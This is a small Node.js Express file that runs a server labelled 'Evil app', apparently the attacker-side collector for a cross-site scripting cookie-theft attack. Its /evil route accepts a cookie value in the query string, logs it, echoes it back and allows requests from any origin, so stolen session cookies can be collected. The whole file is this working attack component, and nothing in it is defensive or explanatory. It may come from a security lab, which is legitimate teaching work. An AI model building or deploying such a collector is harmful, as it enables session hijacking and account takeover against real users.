const express = require('express')
const app = express()

app.get('/evil', function(req, res) {
res.header('Access-Control-Allow-Origin', '*');
  res.send("cookie:  is set to " + req.query.cookie);

console.log(req.query.cookie);
});

app.listen(3000, function () {
  console.log('Evil app listening on port 3000!')
})
